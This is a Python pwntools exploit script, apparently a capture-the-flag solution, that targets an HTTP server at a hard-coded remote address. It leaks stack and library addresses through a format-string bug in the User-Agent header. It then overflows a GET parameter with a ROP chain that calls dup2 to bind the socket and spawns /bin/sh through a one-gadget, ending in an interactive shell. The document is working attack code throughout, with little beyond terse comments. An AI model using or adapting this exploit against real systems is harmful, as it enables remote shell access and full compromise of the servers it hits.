from pwn import *
import requests
import re

remote_b = True

if remote_b:
  host = "http://199.247.6.180:10000/"
else:
  host = "http://localhost:1337/"

host_s = re.findall("http://(.*?)/", host)[0]

def do_fmt(fmt, arg="", final_cut=False):
  req = ""
  req += "GET /{0} HTTP/1.0\r\n".format(arg)
  req += "Host: {0}\r\n".format(host_s)
  req += "Accept-Encoding: gzip, deflate\r\n"
  req += "Accept: */*\r\n"
  req += "User-Agent: {0}\r\n".format(fmt)
    
  h,p = host_s.split(":")
  r = remote(h, int(p))
  r.send(req)
  if not final_cut:
    txt = r.recvall()
    return re.findall("<br>(.*?)</small>", txt)[0][10:]
  r.interactive()

def main():
  elf = ELF("./server")
  libc = ELF("./libc.so.6")

  #1. Leak misc data, e.g. libc + bin base
  leaked_data = do_fmt("%p "*200).split(" ")

  libc_base = int(leaked_data[36], 16) - 0x202e1
  pie_base = int(leaked_data[0], 16) - 0x2006 
  stack_cookie = int(leaked_data[6], 16)
    
  print "stack_cookie: %s" % hex(stack_cookie)
  print "pie base: %s" % hex(pie_base)
  print "libc base: %s" % hex(libc_base)

  #0x0000000000001d9b: pop rdi; ret;
  pop_rdi_ret = p64(pie_base + 0x0000000000001d9b)
  ret = p64(pie_base + 0x0000000000000c4e)
  #0x0000000000001d99 : pop rsi ; pop r15 ; ret
  pop_rsi_r15_ret = p64(0x0000000000001d99)
  #0x00000000000f52b9 : pop rdx ; pop rsi ; ret
  pop_rdx_rsi_ret = p64(libc_base + 0x00000000000f52b9)
    
  # 0xd695f	execve("/bin/sh", rsp+0x60, environ)
  #constraints:
  #[rsp+0x60] == NULL
  magic_gadget = 0xd695f

  #2. Smash stack via GET param
  buf = ""
  buf += "A"*0x48
  buf += p64(stack_cookie)
 
  #setup out
  buf += ret * 4
  buf += pop_rdi_ret
  buf += p64(4) #oldfd
  buf += pop_rdx_rsi_ret
  buf += p64(0x4141414141414141) #junk
  buf += p64(1) #newfd, sock
  buf += p64(libc_base + libc.symbols['dup2'])

  #setup in
  buf += ret * 4
  buf += pop_rdi_ret
  buf += p64(4) #oldfd
  buf += pop_rdx_rsi_ret
  buf += p64(0x4141414141414141) #junk
  buf += p64(0) #newfd, sock
  buf += p64(libc_base + libc.symbols['dup2'])

  buf += ret
  buf += p64(libc_base + magic_gadget)
  buf.rjust(0x100, "\x00")

  r = do_fmt("", "parameter?="+b64e(buf), final_cut=True)

if __name__ == "__main__":
  main()
